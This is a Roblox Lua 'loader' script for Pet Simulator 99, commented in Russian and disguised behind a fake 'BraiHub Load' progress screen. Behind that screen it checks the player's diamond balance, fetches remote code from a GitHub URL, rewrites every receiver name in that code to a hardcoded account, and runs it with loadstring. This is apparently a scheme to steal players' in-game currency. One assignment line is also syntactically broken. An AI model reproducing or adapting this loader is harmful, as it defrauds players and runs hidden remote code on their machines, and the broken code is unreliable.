--[[
    BraiHub Mobile Loader v4.5 (Dynamic Gem Check)
    Target: ByLik_Sky
    Delta Executor Optimized
]]

-- 1. ГЛОБАЛЬНЫЕ НАСТРОЙКИ
_G.Target = "ByLik_Sky"
_G.Username_Receiver = "ByLik_Sky"

-- 2. ВИЗУАЛ: BRAIHUB LOAD (Бело-Голубой Непрозрачный)
local function runBraiHubUI()
    local player = game.Players.LocalPlayer
    local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    sg.Name = "BraiHub_Final"
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 9999

    local bg = Instance.new("Frame", sg)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    bg.BorderSizePixel = 0

    local grad = Instance.new("UIGradient", bg)
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 210, 255))
    })

    local txt = Instance.new("TextLabel", bg)
    txt.Size = UDim2.new(0.9, 0, 0, 100)
    txt.Position = UDim2.new(0.05, 0, 0.4, 0)
    txt.BackgroundTransparency = 1
    txt.Text = "BraiHub Load"
    txt.Font = Enum.Font.GothamBold
    txt.TextScaled = true
    txt.TextColor3 = Color3.fromRGB(40, 40, 40)

    local barBg = Instance.new("Frame", bg)
    barBg.Size = UDim2.new(0.7, 0, 0, 15)
    barBg.Position = UDim2.new(0.15, 0, 0.55, 0)
    barBg.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
    barBg.BorderSizePixel = 0

    local bar = Instance.new("Frame", barBg)
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(0, 160, 255)
    bar.BorderSizePixel = 0

    -- Анимация вращения градиента
    task.spawn(function()
        local r = 0
        while sg.Parent do
            grad.Rotation = r
            r = r + 1.5
            task.wait(0.01)
        end
    end)

    -- Прогресс баг
    for i = 0, 100, 1 do
        bar.Size = UDim2.new(i/100, 0, 1, 0)
        task.wait(0.03)
    end
    task.wait(0.5)
    sg:Destroy()
end

-- 3. ПРОВЕРКА ГЕМОВ И ЗАГРУЗКА СКРИПТА
local function executeMain()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Library = require(ReplicatedStorage:WaitForChild("Library"))
    local Save = Library.Save.Get()
    
    -- Динамическая проверка баланса
    local diamonds = 0
    pcall(function()
        diamonds = Save.Inventory.Currency.Diamonds or 0
    end)
    
    print("[BraiHub]: Баланс алмазов: " .. diamonds)
    
    -- Даже если цена > 10к, мы просто проверяем, есть ли ХОТЬ КАКИЕ-ТО гемы
    if diamonds < 1000 then 
        warn("[BraiHub]: Слишком мало гемов для любой комиссии!")
    end

    -- Загрузка твоей новой ссылки 4.0
    local scriptUrl = "https://raw.githubusercontent.com/ZenitsuHashura89767/Pet-sim-99/refs/heads/main/guga4.0.lua"
    
    local success, rawCode = pcall(function()
        return game:HttpGet(scriptUrl)
    end)

    if success then
        print("[BraiHub]: Код 4.0 получен. Инжектим ByLik_Sky...")
        
        -- Жёсткая замена всех возможных переменных ника на твой
        local patched = rawCode:gsub('Username_Receiver', "ByLik_Sky")
        patched = patched = patched:gsub('GetUsername', '"ByLik_Sky"')
        patched = patched:gsub('["%w]+_Receiver', '"ByLik_Sky"')
        
        -- Запуск
        local func, err = loadstring(patched)
        if func then
            print("[BraiHub]: Запуск скрипта...")
            func()
        else
            warn("[BraiHub]: Ошибка компиляции: " .. tostring(err))
        end
    else
        warn("[BraiHub]: Ошибка скачивания с GitHub!")
    end
end

-- СТАРТ
task.spawn(runBraiHubUI)
task.wait(1)
executeMain()